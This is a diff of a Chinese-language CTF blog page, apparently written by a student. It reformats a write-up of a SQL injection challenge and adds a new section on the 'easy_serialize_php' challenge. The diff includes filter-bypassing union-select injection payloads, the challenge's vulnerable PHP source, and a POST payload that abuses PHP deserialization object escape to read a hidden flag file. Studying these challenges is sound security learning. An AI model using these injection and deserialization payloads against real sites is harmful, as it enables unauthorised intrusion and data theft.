@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Unicorn shop+Web1, null">
+    <meta name="keywords" content="Unicorn shop+Web1+easy_serialize_php, null">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Unicorn shop+Web1 | null</title>
+    <title>Unicorn shop+Web1+easy_serialize_php | null</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -287,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Unicorn shop+Web1</h1>
+                    <h1 class="description center-align post-title">Unicorn shop+Web1+easy_serialize_php</h1>
                 </div>
             </div>
         </div>
@@ -323,6 +323,15 @@
                 </div>
                 <div class="col s5 right-align">
                     
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
                 </div>
             </div>
 
@@ -344,14 +353,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.1k
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    4 Min
+                    7 Min
                 </div>
                 
 
@@ -379,10 +388,10 @@
 <p>2.<a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入</a></p>
 <p>3.<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">bypass information_schema</a></p>
 <p>4.Innodb引擎的利用</p>
-<h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.注册一个帐号后，在申请广告处存在sql注入漏洞，查看广告处存在二次注入漏洞，下图是我在申请广告名为==1‘==后进行查看得到的结果</p>
-<p><img src="/../images/2020-11-22_22-29.png" alt="2020-11-22_22-29"></p>
-<p>2.空格被过滤(因为在申请广告名中含有空格申请后看到的内容里面空格消失，但是可以采用注释符==/**/==绕过)；==or==也被过滤了(因为在提交含有or的广告名时会出现含有敏感词汇页面)，所以无法使用==order by==(可以使用==group by==来进行查询表列数），==information_schema==(可以使用==sys==代替它)；又因为注释符被过滤了，所以还要进行闭合。</p>
-<p>3.`</p>
+<h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.注册一个帐号后，在申请广告处存在sql注入漏洞，查看广告处存在二次注入漏洞，下图是我在申请广告名为<code>1‘</code>后进行查看得到的结果</p>
+<p><img src="/../images/2020-11-22_22-29.png" alt=""></p>
+<p>2.空格被过滤(因为在申请广告名中含有空格申请后看到的内容里面空格消失，但是可以采用注释符<code>/**/</code>绕过)；<code>or</code>也被过滤了(因为在提交含有or的广告名时会出现含有敏感词汇页面)，所以无法使用<code>order by</code>(可以使用<code>group by</code>来进行查询表列数），<code>information_schema</code>(可以使用<code>sys</code>代替它)；又因为注释符被过滤了，所以还要进行闭合。</p>
+<p>3.</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">.</span>查询列数：
 <span class="token number">1</span>‘<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">group</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">by</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">23</span><span class="token punctuation">,</span>'              <span class="token comment" spellcheck="true">---->得到前面select列数为23列;并且测试得到2,3号位为显示位</span>
 <span class="token number">2</span><span class="token punctuation">.</span>查看数据库版本，和当前数据库
@@ -398,16 +407,65 @@
 <span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">c</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'
 <span class="token number">4.4</span>爆第三列<span class="token comment" spellcheck="true">--》拿到flag了</span>
 <span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span><span class="token number">c</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">c</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'</code></pre>
-<p>`</p>
-<p>4.本机查看==innodb_table_stats表==和==innodb_index_stats==表</p>
+<p>4.本机查看<code>innodb_table_stats表</code>和<code>innodb_index_stats</code>表</p>
 <p><strong>MariaDB直到5.5版本，均依照MySql的版本，从2012.11起发布的10.0.0版开始，不再依照MySql版号，10.0.x版以5.5版为基础，加上移植MySql5.6版的功能和自行开发的新功能，在存储引擎方面，10.0.9版起使用Aria来代替Innodb，但是默认开启使用的是Innodb，而上述两个表都是从5.6.x开始自动设置的。</strong></p>
-<p><img src="/../images/2020-11-23_04-04.png" alt="2020-11-23_04-04"></p>
-<p>其中==innodb_index_stats==存储的是innodb引擎的库名，表名及其对应的索引名；==innodb_table_stats==存储的是innodb引擎的库名和表名</p>
-<p><img src="/../images/2020-11-23_04-09.png" alt="2020-11-23_04-09"></p>
-<p><img src="/../images/2020-11-23_04-10.png" alt="2020-11-23_04-10">)<img src="/../images/2020-11-23_04-10_1.png" alt="2020-11-23_04-10_1"></p>
+<p><img src="/../images/2020-11-23_04-04.png" alt=""></p>
+<p>其中<code>innodb_index_stats</code>存储的是innodb引擎的库名，表名及其对应的索引名；<code>innodb_table_stats</code>存储的是innodb引擎的库名和表名</p>
+<p><img src="/../images/2020-11-23_04-09.png" alt=""></p>
+<p><img src="/../images/2020-11-23_04-10.png" alt=""></p>
+<p><img src="/../images/2020-11-23_04-10_1.png" alt=""></p>
 <p>使用这两个表注入的缺点就是无法获得列名。</p>
 <p>5.获得表名之后开始进行无列名注入。</p>
-<script>
+<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.变量覆盖</p>
+<p>2.预包含</p>
+<p>3.反序列化中的对象逃逸</p>
+<h2 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.打开题目就是源码，先对源码进行分析</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//implode函数返回由数组元素组合成的字符串</span>
+    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$filter:正则匹配式；‘’替换的内容;$img进行匹配的字符串</span>
+<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//filter函数就是将$img中在$filter_arr数组的字符串删掉</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//销毁指定变量</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//extract函数：使用数组键名作为变量名，使用数组键值作为变量值，创建对应的变量--》依靠它实现了变量覆盖</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将反序列化后的字符串进行过滤</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!//根据这个提示去查看phpinfo</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//利用file_get_contents函数进行读取</span>
+<span class="token punctuation">}</span> </code></pre>
+<p>2.根据源码中的提示查看phpinfo</p>
+<p><img src="/../images/2020-11-23_06-05.png" alt=""></p>
+<p><code>auto_append_file</code>在页面底部加载文件，与它类似的是<code>auto_prepend_file</code>在页面顶部加载文件，也就是说在index.php加载之后会自动加载此文件，直接<code>f=d0g3_f1ag.php</code>尝试查看它，无法查看，只有尝试使用<code>file_get_contents</code>函数来进行读取。</p>
+<p>3.利用<code>file_get_contents</code>进行读取</p>
+<p>要想利用它，就要利用到<code>img</code>，但是在上面的代码中可以看到，如果不传入<code>img_path</code>，它会被赋值为<code>guest_img.png</code>,传入值的话，又会被<code>sha1</code>函数哈希，导致无法利用。</p>
+<pre class=" language-php"><code class="language-php">payload：
+post<span class="token punctuation">:</span>
+<span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span>Z3Vlc3RfaW1nLnBuZw<span class="token operator">==</span><span class="token comment" spellcheck="true">//这里直接在burp里面post，可以将前面的$_SESSION['user']='guest'覆盖掉</span>
+<span class="token operator">--</span><span class="token operator">--</span>正常序列化后的结果：
+a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string">"flagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>Z3Vlc3RfaW1nLnBuZw<span class="token operator">==</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span>
+<span class="token operator">--</span><span class="token operator">--</span>经过filter函数过滤之后：
+a<span class="token punctuation">:</span><span class="token number">3</span>：<span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>Z3Vlc3RfaW1nLnBuZw<span class="token operator">==</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>可以看到在s：24：“”里面的flag。。。flag都被过滤了，当反序列化的时候读到此处会继续向后读取24个字符，</p>
+<p><img src="/../images/2020-11-23_06-30.png" alt=""></p>
+<p>由因为前面有一个<code>a：3</code>所以它只会读取前三个键值对，后面的内容将会被忽略掉，所以这里成功将<code>Z3Vlc3RfaW1nLnBuZw==(guest_img.png的base64值)"</code>甩掉了，成功将<code>img</code>赋值为<code>ZDBnM19mMWFnLnBocA==（d0g3_f1ag.php的base64值）</code>，在读取到d0g3_f1ag的之后，得到一个hint，直接将修改d0g3_f1ag.php的base64值为hint的base64值即可拿到flag。</p>
+<h1 id="任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。"><a href="#任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。" class="headerlink" title="任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。"></a><center>任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。</center></h1><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -693,9 +751,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Unicorn shop+Web1">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Unicorn shop+Web1+easy_serialize_php">
                         
-                        <span class="card-title">Unicorn shop+Web1</span>
+                        <span class="card-title">Unicorn shop+Web1+easy_serialize_php</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -711,8 +769,12 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            kelise
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -740,9 +802,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Unicorn shop+Web1">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Unicorn shop+Web1+easy_serialize_php">
                         
-                        <span class="card-title">Unicorn shop+Web1</span>
+                        <span class="card-title">Unicorn shop+Web1+easy_serialize_php</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -758,8 +820,12 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            kelise
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -917,7 +983,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
                                     <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.1k</span>&nbsp;字
+                class="white-color">1.8k</span>&nbsp;字
             
             
             
